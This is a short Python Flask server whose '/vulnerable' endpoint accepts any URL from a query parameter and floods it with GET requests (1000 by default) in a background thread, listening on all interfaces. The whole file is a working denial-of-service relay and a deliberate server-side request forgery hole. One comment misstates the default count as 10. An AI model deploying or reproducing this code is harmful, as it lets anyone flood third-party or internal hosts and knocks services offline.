from flask import Flask, request
import requests
from urllib.parse import urlparse
import threading

app = Flask(__name__)

def flood_url(url, num_requests):
    for i in range(num_requests):
        try:
            response = requests.get(url)
            print(f"Request {i+1}: Status Code {response.status_code}")
        except Exception as e:
            print(f"Request {i+1}: Error - {str(e)}")

@app.route('/vulnerable', methods=['GET'])
def vulnerable():
    url = request.args.get('url')
    num_requests = int(request.args.get('num_requests', 1000))  # Default to 10 requests
    
    # Check if the URL parameter is missing
    if not url:
        return "Error: Missing 'url' parameter. Please provide a valid URL.", 400
    
    # Validate the URL format
    try:
        parsed_url = urlparse(url)
        if not parsed_url.scheme or not parsed_url.netloc:
            return f"Error: Invalid URL '{url}'. Please include the scheme (e.g., http:// or https://).", 400
    except Exception as e:
        return f"Error: Invalid URL '{url}'. {str(e)}", 400
    
    # Start flooding the URL in a separate thread
    threading.Thread(target=flood_url, args=(url, num_requests)).start()
    
    return f"Flooding {url} with {num_requests} requests. Check the console for details."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9000, ssl_context=('cert.pem', 'key.pem'))